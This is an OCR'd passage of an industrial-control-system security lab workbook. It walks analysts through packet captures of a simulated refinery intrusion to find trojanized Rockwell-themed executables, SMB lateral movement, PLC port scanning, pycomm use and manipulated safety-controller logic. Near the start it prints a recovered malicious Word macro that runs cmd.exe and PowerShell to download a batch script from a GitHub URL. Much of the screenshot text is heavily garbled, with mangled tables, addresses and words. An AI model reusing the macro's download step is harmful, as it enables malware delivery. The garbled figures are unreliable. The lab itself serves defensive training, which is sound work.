raw.githubusercontent. con/reicanaryoo/atoni red- team/master/ARTifacts/Chain \_Reactions/chain_reaction_DragonsTail.psi').

oH, [eRe oN BOP i ss ccae'c Densecersecsven Ororsveccecreces See ree AG@O..... ABP... ss AGO..... ABP cae =>
Banee wae pa age Attribut.e VB_Nam.e = nad. ulei”

S.ub Aa bagabecior eatetchiCinaaoiee: -Pr.v4()
+-Const .ShellwinPdows.._.6".{9BAQ597 .2-F6A8-1.1CF-A442. -Q@AOC90 .ASF39}.v.1.Se.GW.=Get .Object(".new:" &

_@). Item, .S.W.Docume.nt.Appli.cation,...Exec,."cm.d.exe", ."/c powe.rs.Y.
IWR. -uri “".https://.raw.gith.ubuserco.nt./com/r.edcanary.co/atomi.c-. -team./master/.ARTifact.s/Chain_.Re...Is/
e.....0.0 Dran...Tail ba.t®" -Out File F~\.k.s\navina?d. .:

*Note* There is plenty of interest to explore here but the most interesting is the powershell.exe file and the
Dragonstail.bat file. These are the strings of tools and commands that are present in the word document as it
was being transferred across the network. Powershell is a commonly abused native Windows utility delivered
by numerous state and criminal actors. It helps us understand that the Resume.doc is malicious and is moving
files into the network that are common for adversaries to try to gain elevated credentials and move around
the network.

4. What are two other likely malicious files that help show this as a Stage 1 intrusion?

cip_plc_information.exe

cip hmi_emulator.exe

> Clear any open filters

*Note* Because we know there are file transfers of interest going on in the packet capture we can look to see
if there are any files that are of interest.

© 2021, Robert M. Lee Lab 3.1-5
>

> Click HTTP...

*Note* There are a lot of files in this packet capture which is not uncommon in network traffic. However, a lot
of it is to the rckwel.ru domain which means that many of these are probably worth understanding. First let’s
look for obvious standouts. Sort the files by clicking the Filename column. When we do that, we see a number

Export HTTP Objects
> Click on File
> Hover over Export Objects

Save As...

Edit View Go Capture Analyze Statistics Telephony Wir

Opel

Open Recent

Merge...

Import From Hex Dump...
Close

File Set

Export Specified Packets...

Export Packet Dissections
Export Packet Bytes...
Export PDUs to File...

Export TLS Session Keys...

Export Objects

Print...

_Quit

Ctrl+o % Ko o¥l :

Destination
10.10.255.2
Ctrl+w | 224.0.0.252
| 224.0.0.252
| 224.0.0.252
Ctrl+Shift+S | 9594 6.0.252
»| 224.0.0.252
-}  224.0.0.252|
224.0.0.252
>| 224.0.0.252
. | 10.10.255.2
Ctrl+Shift+x | 49.19.255.2
4192.41.148.

Ctrl+P | HTTP.
Ctrl+Q | IMF.
SMB.
|
| TTP.

10.10.6.10

DICOM...

of interesting files including the original Resume.doc file but also Rockwell themed files such as RSLINX.exe
and FTActivationBoost.exe

Packet
85131
32853
37594
46461
20442
25920
50603
597
737

Hostname

rckwel.ru
rckweLru
rckweLru
rckwelru
rckwel.ru
rckweLru
rckwel.ru
rckwel.ru
1

+

Wireshark - Export - HTTP object list

Content Type
text/plain

application/x-msdos-p...
application/x-msdos-p...
application/x-msdos-p...
application/x-msdos-p...
application/x-msdos-p...
application/x-msdos-p...

application/msword

Size
40 bytes

5,134 kB
5,138 kB
5,134 kB
5,137 kB
5,135 kB
5,135 kB
265 kB

application/octet-stream 64 bytes

_ Filename : : re

BootpServer.exe
ControlFLASH.exe
FTActivationBoost.exe

RADrvDBMgr.exe

bem

These files could be legitimate or trojanized applications. When you click on one of the file names it will take
you to that point in the packet capture where it is found.

© 2021, Robert M. Lee

Lab 3.1 -6

2,

=)

m™ oe > ® ®) e) () ®) (®) (®) (®) (eo) (@)

ii)
a ee

ye ww

rr a

oe ww Ww

<p’

> Click on RSLINX.exe

85131 text/plain 40 bytes

32853 rckwel.ru application/x-msdos-p... 5,134kB | BootpServer.exe
37594 rckwel.ru application/x-msdos-p... 5,138kB — ControlFLASH.exe
46461 rckwel.ru application/x-msdos-p... 5,134kB — FTActivationBoost.exe
20442 rckwelru application/x-msdos-p... 5,137kB = RAComSrv.exe

25920 rckwel.ru ... 5,135 kB

rckweLro

iApply a dis jay filter

oO. Time Source
50592 437, 199192 192.41.148,220
50593 437.190194 10.19.0.108
50594 437.190199 192.41.148.220

50595 437. 190200 10.10.0.190 597 eckweLru application/msword 265 kB Resume.dd
50596 437.190209 192,41.148.220 737 rckwel.ru application/octet-stream 64 bytes __utm.gif
50597 437.190214 192.41.148.220 748 rckwel.ru application/octet-stream 64bytes __utm.gif
50598 437.190221 192.41.148.220 759 rckwel.ru application/octet-stream 64 bytes __utm.gif
50599 437.190227 192.41.148.220 770 rckwel.ru application/octet-stream 64bytes __utm.gif
50600 437.199234 192.41.148.220 781 rckwel.ru application/octet-stream 64bytes __utm.gif
50601 437.190350 10.10.0.10 792 rckwel.ru application/octet-stream 64 bytes __utm.gif
50602 437.190358 10.10.6.10 803 rckwel.ru application/octet-stream 64 bytes __utm.gif
59603 437.191671 192-41.149; 220 813 rckwel.ru application/octet-stream 64bytes __utm.gif
50604 437. 191875 10.19.9.10 824 rckwel.ru application/octet-stream 64 bytes __utm.gif
> Review the selected packet’s stream
> Minimize the files window
> Right click on the selected packet
> Follow > TCP Stream
> Review the stream
Iv.i0.0.19 I9Z. 41, 148.2209 CF UF DI9IS SU [ACK] Seq= |
192. 41.148.220 TcP 54 [TCP visions Update] 5
18 HTTP/1.0 260 OK (app
een Packet CtrlemM 54 51553 ~- 80 [ACK] Seq=

Ignore/Unignore Packet Ctrl+D

Ethernet II, Src: Sarian_ 20:8) da set/Unset Time Reference ctrlat (f8:db:88:3c:53:04)

nternet Protocol Ve

h : Time Shift... Ctrl+shift+T en 2
Packet Comment... Ctrl+Alt+c 6475(1460) #46476(1460)
Edi L d Name

edia Type

‘Apply as Filter »

f8 db

Prepare as Filter »
Conversation Filter
Colorize Conversation
SCTP

TCP Stream ctrlsale!
ame (618 bytes) | | Reassembled TcP (1352 ~ oe an seamccmm| TLE S a
Protocol Preferences >| uTTP stream Ctrleale!

7 _ itincident.pcap

Decode As... i

*Note* As we did earlier, search through the ASCII data quickly to identify human readable sections and see if
there is anything of interest.

© 2021, Robert M. Lee Lab 3.1-7
is). -UPhlb) or... dw, + )...urllib.error).r....i-w..i -urllib.parse).r....i.]..i-
2..)...urllib.request).r....if{...i.z..)..-urllib. response). REE 1 dere t pera pened TD Lg cure hy Were sane Bert

webbrowser).r....i-.

Tk -)...xmL).7....i.Ts.d... xml.parsers).r....i.V.......)...xml.parsers.expat).r.... vos) os oXML. SAX)... 1<X..
i. xml. sax._exceptions) wA..i....)...xml.sax.expatreader).r. Be gs Bee Sheen eek ndler).r....i>|..

o .xml,sax.saxutils).r. b. .xml.sax.xmlreader).r....i. -zipfile);r....i. 4

mpyimod@1_os_path.......
...H..mpyimod03_importers 4
.8 scip_plc_information.

see eeneeee e.mstruct..
$} .mpyimod02_archive. .
©..3....L...0.spyiboote1_bootstrap

Po.

$8. bYCRUNTIME140.d11l... : B. )_bz2.pyd... )_ctypes.pyd......
‘ * “ b_lzma.pyd. * b_socket .pyd.
cip pic informa exe manifest....
1052} +..2 .b1Libss.
,..Z..bselect .pyd....... @..NH....

name cip_plc_information.exe.manifest......-...-+-++++++
. Pee 1S BE + 2PYZ-@8.pyz.

4 .xbase_library.zip.
oo eshe op Die te bu wwe ‘python37.dll..

1 client pkt, 1 server pkt, 1 turn.
Entire conversation (5,135 kB) * Show and save data as ASCII bil

*Note* At the end of the data there are references to python which is unlikely used by Rockwell’s application
in an ICS environment. Moreover, there are executables inside the executable focused on CIP, which is a
protocol leveraged by Rockwell and others, and PLCs. The “cip_plc_information.exe” executable is something
we’d flag for further analysis, and it also helps us understand that if the adversary is leveraging this capability
we’re likely to see direct interaction through CIP with our PLCs. This is very likely an ICS tailored capability and
not just an ICS themed one.

> Clear existing filters and return to File > Export > HTTP...
> Repeat the previous step for other executables such as FTActivationBoost.exe

AW crea J. xml, Sax).F...-4AX.-
1.sax.handler).r....iC]..i
yO ES CL eee Oy mere

Joxml). F.1d Ts sds sss )++ XML, parsers).r...-i-Ve.--
xml.sax._exceptions) iA. .i

.xml.sax.saxutils).r....iM
oavians ae mee e€.mstruct.. 8
$}.mpyimod@2_archive..........5-
.L...0.spyiboot01_bootstrap ‘ . )_ mit
$8. bVCRUNTIME140.d11... alee -b_bz2. .b_ctypes.pyd......

F - - _ssl.pyd... beip_hmi_emulator.exe.manifest
..!. .bliberypto-1_1.d11 sa btacess« 2 .blibssl-1_1.dl1l... bpyexpat .pyd......
ah p..7...bpython37.dll. ...-@..bunicodedata.pyd.......6e.seeeeeee ard
49 . opyi-windows -mat cs
@. .xbase_library.zip...
we J ALJ... .. +. Sopython37.d1l
1 client pkt, 1 server pkt, 1 turn.
Entire conversation (5,134 kB) Ns Show and save data as ASCIl x

*Note* Again, we identify some suspicious CIP based executables, in this case cip_hmi_emulator.exe. These
files are not immediately malicious but highly suspicious as an embedded executable amongst python code
and both executables. At this point it is safe, and accurate, to assume these are malicious.

© 2021, Robert M. Lee Lab 3.1-8

(3) (3) oe awe @) a) ) (?) (®) @®) ®) ee @®

(3)

ao,

oe,
ip is is

ip!

ip’

‘5!

ae GS

Lab 3.2 - Investigating Stage 2 Intrusions _

e Distinguish Stage 2 from Stage 1 Intrusions
e __ Leverage Traffic Analysis to Follow Intrusions
e Identify Key Artifacts and Indicators from Intrusions

*Scenario Information* Having determined that the Enterpise1 system was compromised and communicating
to a C2 server the team has decided to quickly pivot to the OT network. As a member of the threat detection
team you need to determine if there are any compromised systems in the OT network and any information you
can glean in Calistoga Refinery to help determine if we need to perform incident response.

This exercise will utilize your RELICS VM and the otincident.pcap file in the ICS515 folder on the Desktop of the

1. What new system is communicating to 192.41.148.220?

2. How was the system likely compromised and are there any other systems likely compromised?

3. What is the name of the malicious project file?

4. What is the file size of RSLINX.exe at its largest and what is the file size of Resume.doc?

5. Why is this intrusion a Stage 2 intrusions?

© 2021, Robert M. Lee Lab 3.2 -1
Task — Analyzing the OT Network Communications

1. What new system is communicating to 192.41.148.220?
10.10.10.30

> Start your RELICS VM

> Login to the VM
> LOGIN =relics
> PASSWORD = relics

> Navigate in the Terminal to ics515 > calistogarefinery > pcaps
> — Inthe Terminal run the command:
cd Desktop/ics515/calistogarefinery/pcaps/

S$ cd Desktop/ics515/calistogarefinery/pcaps/

itincident.pcap normalops.pcap otincident.pcap

> Run Zeek against the otincident.pcap file
> Inthe Terminal run the command:
zeek -C -r otincident.pcap

ent.pcap

*Note* This reads the pcap back against the tool Zeek which then automatically parses it based on the
configuration of Zeek. We’re not using Zeek as an intrusion detection system in this case but instead as a
network scripting language, it’ll automatically produce logs, very similar in thought process to syslog for
network traffic, that we can then review to answer the questions we have.

> Analyze communications with 192.41.148.200
> Run the following command in the Terminal
cat conn.log | zeek-cut id.orig_h id.resp_h | grep 192.41.148.22 | sort | unig
> Determine the new IP address

$ cat conn.log | zeek-cut id.orig_h id.resp_h | grep 192.41.148.22 | sort | uniq
10.10.0.10 192.41.148.220

10.10.10.30 192.41.148.220
192.41.148.2268 10.10.16.36

© 2021, Robert M. Lee Lab 3.2 -2

@) (®) @) (@) @@) )

(®)
Ss

4

*Note* This command reads the connection logs and uses the ASCII Zeek logs to select out information you
designate such as the origin and response IP addresses; then it greps for the IP address we wanted to find
communications too (192.41.148.22) and sorts it only displaying unique values. This is much faster than sifting
through Wireshark.

*Answer™ We already knew about the 10.10.0.10 address but we didn’t know about the 10.10.10.30 IP
address (based on the previous understanding of the network diagram).

2. How was the system likely compromised and are there any other systems likely compromised?

RSLINX.exe and beacon.exe moved
laterally from IT system

10.10.10.20

*Note* Zeek creates numerous log files automatically when parsing network traffic. One of those log files is
files.log which extracts the various files that traverse network traffic similar to Wireshark’s Export function.

> Analyze the files to see if anything was transferred to 10.10.10.30
> Run the following command in the Terminal

cat files.log | zeek-cut tx hosts rx_hosts source filename | grep
10.10.10.30

cat files.log | zeek-cut tx_hosts rx_hosts source filename | grep 10.10.10.30
192.41.

\\Admin\\b
\\Admin\ \b

*Answer* Here we see that 10.10.0.10 (IT system) is transferring files to 10.10.10.30 (OT system) via SMB and
that there are a number of interesting files such as RSLINX.exe and beacon.exe. This all likely represents lateral
movement.

*Note* Knowing that 10.10.0.10 is performing the lateral movement we can see if there are other systems
than just 10.10.10.30 infected by running the same command as before but pivoting off of the infrastructure
the adversary is using internal to our network (.10).

© 2021, Robert M. Lee Lab 3.2 -3
> Analyze other files transferred from 10.10.0.10
> Run the following command in the Terminal
cat files.log | zeek-cut tx_hosts rx_hosts source filename | grep
10.10.0.10

Admin\\Desktop\\share\\flexsvr.exe
Admin\\Desktop\\share\\flexsvr.exe: Zone. Identifier
Admin\\Desktop\\share\\FTActivationBoost.exe
Admin\\Desktop\\share\\FTActivationBoost.exe
Admin\\Desktop\\share\\FTActivationRoost.exe:Zone.id
Admin\\Desktop\\share\\nxlog-ce-2.10.2150.msi
Admin\\Desktop\\share\\nxlog-ce-2.10.2150.msi
Admin\\Desktop\\share\\nxlog-ce 10.2150.msi:Zone.I
Admin\\Desktop\\share\\RAComSrv.exe
Admin\\Desktop\\share\\RACo v.exe
Admin\\Desktop\\share\\RAComSrv.exe: Zone. Identifier
Admin\\Desktop\\share\\RAComSrv.exe
Admin\\Desktop\\share\\radmin.exe
Admin\\Desktop\\share\\radmin.exe
Admin\\Desktop\\share\\radmin.
Admin\\Desktop\\share\\ vDBMgr
Admin\\Desktop\\share\ rvDBMgr .e
Admin\\Desktop\\share\\RADrvDBMgr .ex ne.Identi
Admin\\Desktop\\share\\

Admin\\D: op\\share\\R

Admin\\Desktop\\share\\R
Admin\\Desktop\\share\\Resume (1).doc:Zo Identifie
Admin\\Desktop\\share\\Resume (
Admin\\Desktop\\share\\Re
Admin\\Desktop\\share\\Resume. :Zone. Identifier
Admin\\De p\\share\\RSLINX
Admin\\Desktop\\share\\RSLINX.

*Answer* It is clear the same malicious files as well as some others such as flexsvr.exe are being transferred to
10.10.10.20 another ICS device.

3. What is the name of the malicious project file?

BurnerManagementinfected.ACD

*Note* We can review everything but let’s focus in on the SMB communications as that is commonly abused
for lateral movement.

> Analyze the files transferred via SMB to 10.10.10.30
> Run the following command in the Terminal
cat smb files.log | zeek-cut id.orig_h id.resp_h name | grep
10.10.10.30

© 2021, Robert M. Lee Lab 3.2-4

eo ra) = jf cm

a]

o

i]
ip

‘s

7 oe

<B

4s ae as as «s as as as «Ss as

“,

as

S$ cat smb_files.log | zeek-cut id.orig_h id.resp_h name | grep 10.10.10.30
3 \\srvsve

\\wkssve

\\srvsve

\\wkssvc

\\srvsve

B. 0

\\Admin\ \Desktop\\share\\RSLINX. exe

\\Public\\desktop.int
\\Admin\\Desktop\\BurnerManagementInfected.ACD
\\Admin\\Desktop\\BurnerManagementInfected.L5K

*Answer* You could have seen this in the other command as well but knowing that the files were being
transferred via SMB this was the easiest/cleanest way of getting to the answer. The
BurnerManagementinfected .ACD and .L5K files are the ones we want; we'll record one for the purpose of the
answer but either would be right and we’d want to extract both for analysis later.

4. What is the file size of RSLINX.exe at its largest and what is the file size of Regume.doc?
265728 bytes___

5135056 bytes

> Determine the size of the files using Zeek
> Run the following command in the Terminal
cat files.log | zeek-cut filename total bytes | grep Resume.doc
> Record the answer
Run the following command in the Terminal
cat files.log | zeek-cut filename total_bytes | grep RSLINX.exe
> Record the answer

cat files.log | zeek-cut filename total_bytes | grep Resume.doc
dmin\\Desktop\\share\\ 265728
dmin\\Desktop\\share\\ :Zone. Identifier

cat files.log | zeek-cut filename total_bytes | grep RSLINX.exe
\Admin\\Desktop\\share\\ 5135056
\Admin\\Desktop\\share\\ :Zone.Identifier:
Kdmin\\Desktop\\share\\ 5135056
dmin\\Desktop\\share\\ 5135056
dmin\\Desktop\\share\\ :Zone. Identifier

*Answer* RSLINX.exe is roughly 5,135,056 Bytes and Resume.doc is roughly 265,728 Bytes. Also translates as
5,138 kB and 265 kB respectively.

© 2021, Robert M. Lee Lab 3.2-5
5. Whyis this intrusion a Stage 2 intrusions? open ended question

The intrusion is clearly focused on the ICS portion of the network. The intrusion in the Enterprise qualifies as a
Stage 1 intrusion because there was a demonstratable focus by the adversary to get into ICS networks, not just
target the enterprise networks that happen to be an industrial company. The intrusion progressed into
accessing the Engineering Workstation in the ICS and it is not some incidental infection; it is clear with the
Rockwell themed files and the positioning on the Engineering Workstation that the adversary is either in the
Develop phase of Stage 2 of the ICS Cyber Kill Chain or they are already poised and ready for the attack
(potentially meaning that they have had access before to the environment for development of capabilities,
this is not certain though).

© 2021, Robert M. Lee Lab 3.2 -6

eo

a ae a, @ @) @ @ @ @

)

a @ @

ny am @

an @
vn a

ws ie

is!

is

~~ — __ 7» ed “7 “s “Bp iB’

==

_Lab 3.3 — Traffic Analysis of Control Manipulation

e Leverage Traffic Analysis to Aid Root Cause Analysis
e Identify the Manipulation of Control through Protocol Analysis

*Scenario Information* The OT network is definitely compromised and as we spin up the incident response
team it is important to do as much analysis as possible to support the investigation. At this point we are hyper
concerned about the communications to the controllers and systems that operate the safety system and need
to determine if any manipulation or changes are taking place.

Exercise Prep

This exercise will utilize your RELICS VM and the otincident.pcap file in the ics515 folder on the Desktop of the
VM.

1. What is the first tactic that the adversary performs against the PLC?

2. What ports does the PLC have open?

3. What is the tool being used to interact with the PLC?

4. What is the root cause of the impact in the facility?

5. About when does the PLC go offline and why is it likely still seen on the network?

© 2021, Robert M. Lee Lab 3.3-1
Task — Traffic Analysis ;

1.

*Note* With the Engineering Workstation very clearly compromised at this point it is critical to identify the

What is the first tactic that the adversary performs against the PLC?
Scanning

> Start your RELICS VM

>  Loginto the VM
> LOGIN=xrelics
> PASSWORD = relics

> Open otincident.pcap in Wireshark
> Open the ICS515 folder located on the Desktop and then navigate to calistogarefinery > pcaps
> Double click on otincident.pcap to open the file in Wireshark

> Analyze communications to and from the 10.10.20.10 PLC
Create a filter in Wireshark for ip.addr==10.10.20.10
Select Statistics > Conversations

Limit to Display Filter

Navigate to the TCP tab

Review for anything abnormal

VVVVV

potential impact. Engineering Workstations have an important role in programming the logic of PLCs. We
know from the asset inventory and topology that 10.10.20.10 is one of the facility’s Rockwell ControlLogix

PLCs and that it is playing the role of a safety PLC for the Burner Management System. It is important to see if

any malicious activity is taking place. In some facility’s an Engineering Workstation will not have consistent
communications to the PLC, only communicating when changes are being made, in some facilities though
there may be consistent communications. So historical data, that we do not have in this scenario, for this
facility would be very important to quickly diagnosing it. For us we will have to work with what we have.

File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help

40640 MR OAK OVHALE

i is) Wy

(W]ip.addr==10.10.20.10

No. Time 2 Source - _ Destination ace a Protocol Li
| 1293.. 1752.394388 10.10.20.10 ~~ 40.10.10.30 TCP
| 1293... 1752.399433 10.10.20.10 10.10.10.30 cIP
| 1293... 1752.578633 10.10.10.30 10.10.20.10 TCP
A902 414759 7ADOAA 18 416 49 26) Af 40 9 46 Js Pa
© 2021, Robert M. Lee Lab 3.3-2

(2)

“beh

hob)
a

Ty

Cp “a

‘a

Capture File Properties

Resolved Addresses
Protocol Hierarchy
Conversations

18:..28 1

10.20.1 Endpoints
10.10. Packet Lengths
10.10.3'

10.20.1; /OGraph

10.20. 1 Service Response Time

Wireshark - Conversation}

Ethernet-3 IPv4-3  IPv6 | TCP-86 | UDP-4

AddressA * PortA AddressB  PortB _—Packets ~— Bytes _~—— PacketsA>B BytesA>B
10.10.10.20 54741 10.10.20.10 44818 35,607 3,970k 17,635 2,00
10.10.10.20 57617 10.10.20.10 21 4 252 2 1
10.10.10.20 57620 10.10.20.10 22 4 252 2 |
10.10.10.20 $7623 10.10.20.10 23 4 252 2

70.10.10.20 57625 10.10.20.10 25 4 252 ys }

| 10.10.10.20 57628 10.10.20.10 80 14 820 8

10.10.10.20 57630 10.10.20.10 135 4 252 2

10.10.10.20 57632 10.10.20.10 139 4 252 2

10.10.10.20 57634 10.10.20.10 443 4 252 2

10.10.10.20 $7636 10.10.20.10 445 4 252 2

*Note* Communications between a PLC and its control software are often fairly predictable. It is not fair to
say they are consistent, and that any anomaly is worth investigating, they are not as static communications as
people would like to believe sometimes. But they are generally consistent. Here we see that there are the TCP
port 44818 communications for EthernetIP/CIP we would expect. But there are also a lot of other ports being
accessed by 10.10.10.20 (Factory Talk View HMI) with 4 packets each. A review of who is sending what will
reveal that 10.10.10.20 is sending 2 packets to 10.10.20.10 (Safety PLC) each at 132 bytes who is responding
with 2 packets each time with 120 bytes. This is very characteristic of scanning activity.

> Analyze the potential scanning activity
Select any of the potential scanning
Right click

Apply as Filter > Selected > A<->B
Minimize the Conversations window
Review the traffic

VVVVV

© 2021, Robert M. Lee Lab 3.3-3
~ Protocol Length info
FCP. 66 $7638 + 185 [SYN] Seq=9 Win-8192 Len=<
‘ st noked W

Destination

*Note* It is clearly scanning where the 10.10.10.20 sends a SYN request to a port on 10.10.20.10 that is closed
so it replies with a RST, ACK packet.

*Answer* Scanning

2. What ports does the PLC have open? 44818

80

> Review Conversations on 10.10.20.10 again
Apply the filter ip.addr==10.10.20.10
Navigate to Statistics > Conversations
Select the TCP tab

Sort by the Packets column

Review the findings

VVVVWV

Wireshark - Conversations

Ethernet-3 IPv4-3  IPv6 TCP-86 | UDP-4
Address A Port A Address B Port B Packets * Bytes Packets A>B BytesA>B
10.10.10.20 54741 10.10.20.10 44818 35,607 3,970k 17,635 2,000
10.10.20.10 44818 10.10.10.30 1746 25,615 4,412k 12,886 2,42
10.10.20.10 44818 10.10.10.30 1511 25,051 5,621k 12,567 2,831
10.10.10.20 64672 10.10.20.10 44818 117 30k 57 6,5
10.10.20.10 44818 10.10.10.30 1746 31 4,839 15 2,5
10.10.10.20 59845 10.10.20.10 44818 19 1,790 10 od
10.10.10.20 59273 10.10.20.10 44818 19 1,790 10 9
10.10.10.20 51472 10.10.20.10 44818 17 1,589 9 8
10.10.10.20 57628 10.10.20.10 80 14 820 8 a
10.10.10.20 57811 10.10.20.10 44818 12 71Z 6 3
10.10.10.20 51394 10.10.20.10 44818 11 805 6 4
10.10.10.20 58436 10.10.20.10 44818 11 856 6

10.10.10.20 51393 10.10.20.10 44818 9 598 5 3
10.10.10.20 57617 10.10.20.10 21 4 252 2 1
10.10.10.20 57620 10.10.20.10 22 4 252 2 1
10.10.10.20 57623 10.10.20.10 23 a 252 Zz 1
10.10.10.20 57625 10.10.20.10 25 ct 252 2 1

*Note* We see that the 10.10.20.10 has the TCP ports 44818 and 80 open. Other ports like TCP port 21, 22,
23, and 25 only have 4 packets which was the SYN followed by RST, ACK pattern we saw previously indicating
it is closed.

© 2021, Robert M. Lee Lab 3.3 -4

(B)
oh

a

CU Tt |

*Answer* TCP port 44818 and TCP port 80
3. What is the tool being used to interact with the PLC? pycomm

*Note* Based on previous labs we know that 10.10.10.30 was compromised and a malicious project file was
transferred to it by the adversary. A natural starting point to determine what happened right before the
communications were happening between 10.10.10.30 and 10.10.20.10 especially if there was any logic
manipulation.

> Review communications between 10.10.10.30 and 10.10.20.10
> Apply the filter ip.addr==10.10.10.30 && ip.addr==10.10.20.10
> Click the first packet
> Right click and Follow > TCP Stream

i  ——————
File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help
A464@m@  RGOQAK VHA.

& lip.addr==10.10.10.30 && ip.addr==10.10.20.10

No Time ~ Destination Protoc
1 9.000000 10.10.19.30 10.10.20.19 cIP
2 8.001201 10.10.20.10 10.10.10.30 TCP
3 0.004695 10.10.20.10 10.10.10.30 CIP
4 0.163838 10.10.10.30 10.10.20.10 TCP
33 0.494983 10.10.10.30 10.10.20.10 CIP
34 6.499400 10.16.20.10 10.10.10.30 TCP

*Note* This will filter the session down to tcp.stream eq 0 as a filter. There are numerous streams and they
are sorted in order numerically starting at 0. Unfortunately, we see this stream does not have anything
worthwhile.

(nse u” BBAC>

Wireshark: Follow TCP Stream (tcp.stream eq 0)

otincident.pcap

4 @.103838 ]
33 6.494983 |

34 8.499406 Bt Ste
35 0.499416 }

59 6.665626 | es
|

|

144 1.167166 j
Frame 1: 242 bytes on wire (1936 bits), 24
Ethernet II, Src: Dell_3c:53:0b (f8:db:88:
Internet Protocol Version 4, Src: 10.10.18
Transmission Control Protocol, Src Port: 2...
Ethernet/iP (Industrial Protocol), Sessia
Common Industrial Protocol

80 ©0 be 5a 72 ce fa db 68 3c 53 eb f
© 08 ed b7 84 40 69 GO BG 10 54 Oa Gat

© 2021, Robert M. Lee Lab 3.3-5
> Filter on tcp.stream 1

Exit the TCP Stream window that was open
Apply the filter tcp.stream eq 1

Click the first packet

Right click and Follow > TCP Stream
Review the traffic

VVVVV

. 369657 18.18.10.26

+ 373803 10.18.16.26 « DYCOMM. + 562-2

9 8.375686 10.18.20.16

16 6.375867 16.10.10.20

11 6.377849 10.10,20.18

12 6.378051 10.10.10.20
13 6.385692 16.10.20.18

14 8.385989 10.16.10.26

15 8.388742 10.10.20.16
16 6.389941 16.16.10.20

ame 5: 66 bytes on wire (528 bits), 66 B
II, Src: Dell_3¢:53:0a (f8:db:88
iternet Protocol Version 4, Src: 10.10.14
‘ansmission Control Protocol. sre Port: 4

*Note* Here we see that pycomm is on the 10.10.10.20 and interacting with the 10.10.20.10 which is the
Burner Management System. Further it is clear there are a lot of values including levels, Timers, Time Delay,
and Start that may have interaction. It appears the Engineering Workstation is leveraging a python-based tool
on it, that we saw the adversary transfer earlier, to interact with and change values on the PLC.

*Note* There are too many streams usually (and including here) to go through each stream manually. This is
where more advanced tools and analysis are helpful. However, we can get back to where we need to be
quickly by focusing in explicitly on the CIP communications knowing that is how the Engineering Workstation is
interacting with the PLC.

*Answer* pycomm

4. What is the root cause of the impact in the facility? Manipulated logic on the safety controller
> Analyze the CIP communications

> Apply a filter for enip
> Review at a high level without getting into packet details yet

* Source

Protocol Length info i:
10.18. “CIP 242 Multiple Service Packet: Get Attribute List, Get Attribute Li.
10.10. cIP 319 Success: Multiple Service Packet: Get Attribute List, Get Att...
10.10. ENIP 82 Register Session (Req), Session: 6xe9980000
10.10. ENIP 82 Register Session (Rsp), Session: 6x10024166
10.19. ENIP 78 List Identity (Req)
10.18. ENIP 129 List Identity (Rsp), 1756-ENBT/A
10.16 cIP CM 114 Unconnected Send: Identity - Get Attributes All
16.10 cIP 144 Success: Identity - Get Attributes All
14 9.385989 10.10. cIP CM 146 Connection Manager - Large Forward Open (Message Router)
15 8.388742 16.10. cIP CM 98 Service not supported: Connection Manager - Large Forward Open
16 8.389041 16.10. cIP CM 142 Connection Manager - Forward Open (Message Router)
17 6.398508 10.10. cIP CM 124 Success: Connection Manager - Forward Open
© 2021, Robert M. Lee Lab 3.3-6

a)

ey

> * & &

ex & & ww

7 m7oanqqeneqnneeeeee® ®
ae we w F&F

ua ie’ Lt Ui Lt i U

Le

uC VS Vw we Ww

*Note* It’d be useful to have a record of all the commands and values that were sent in the pre-incident
packet capture and to identify any anomalies or differences now that we know that this packet capture has an
incident in it. You could write a script to accomplish this or use a professional tool but for the interest of time
and simplicity we can generally remember that there were a lot of commands in the pre-incident packet
capture around Multiple Service Packet, TimeDelay Successes and similar, and Registered and Unregistered
Sessions. You could sort by Info and see the different commands in Wireshark but first we can see if anything
stands out in the capture.

*Note* Scroll quickly through it by dragging the scroll bar to the far right of Wireshark.

Destination Protocol Length info

*Note* Towards the end of the capture you'll see a lot of TCP Spurious Retransmission. Essentially, the CIP
communications are not active anymore or appear to have gone offline. We will look at that more closely in
the next question. For now, scroll to the point just before the retransmissions and see if you can identify
anything of interest.

*Note* Scrolling slowly up from the beginning of the retransmissions we can see some status messages that
stand out due to what they are and the fact that they were not in the pre-incident packet capture. The one
that stands out the most is the Partial transfer: Service status message.

Destination _ ____ Protocol Length Info :

10.10.10.20 cIP 598 Partial transfer: Service (0x55)
10.10.20.18 cIP 122 Class (Ox6b) - Service (0x55)
10.10.10.20 CIP 55/7 Partial transfer: Service (0x55)
10.10.20.10 CIP 122 Class (®x6b) - Service (0x55)
10.10.10.20 cIP 596 Partial transfer: Service (@x55)
10.10.20.10 CIP 122 Class (0x6b) - Service (x55)
16.10.10.20 CIP 558 Partial transfer: Service (0x55)
10.10.20.10 CIP 122 Class (@x6b) - Service (0x55)
10.10.10.206 CIP 588 Partial transfer: Service (0x55)
10.10.20.10 cIP 122 Class (®x6b) - Service (0x55)
16.10.10.20 cIP 567 Partial transfer: Service (0x55)
18.10.20.10 cIP 122 Class (Ox6b) - Service (0x55)

*Note* This message notes that there is data transfers taking place between the Engineering Workstation and
the PLC which is indicative of a logic change. This in of itself is not abnormal but during operations and not a
maintenance window it becomes a bit more abnormal. However, in the context of what we know about the
infected project file at the Engineering Workstation this builds a strong case of the root cause for the impact at
the facility: the modification of the PLC’s logic from the Engineering Workstation.

*Answer* The PLCs logic was in fact manipulated by the EWS
© 2021, Robert M. Lee Lab 3.3-7
5. About when does the PLC go offline and why is it likely still seen on the network?
2020-07-16 23:31:29

PLC crashed but network card remained online

At this point we do not want to just see the ENIP communications but instead any of the communications
between the PLC and the Engineering Workstation.

> Analyze the CIP communications explicitly between 10.10.10.30 and 10.10.20.10
Apply a filter for ip-addr==10.10.10.30 && ip.addr==10.10.20.10

Scroll to where the majority of the retransmission are taking place

Select View > Time Display Format

Choose the format you want to use such as “date and time of year”

Review the findings

VVVV WV

| 4594... 3445.508667 10.16.10.30 10.10.20.10 TcPe 541746 —~ 44818 [ack] Se
.. 3453 .508588 10.18.20.10 10.10.16.30 60 44818 - 1746 [ACK] Se
0 3453 . 508599 10.10.18.30 10.10.20.10° = e

.. 3455 .562230 10.10.20.10 10.10.10.30 60 44818 ~ 1746 [ACK] Se

| 4596... 3455.575476 10.10.20.10 10.10.10.30 TcP 60 44818 - 1746 [ACK] Se

¥ Main Toolbar =: A,
5 =

Filter Toolbar
=] 0 wireless Toolbar
iv) Status Bar

~ Protocol ‘Length Info

| 10 cIP 242 Multiple Service Packet: Get Attribute Li
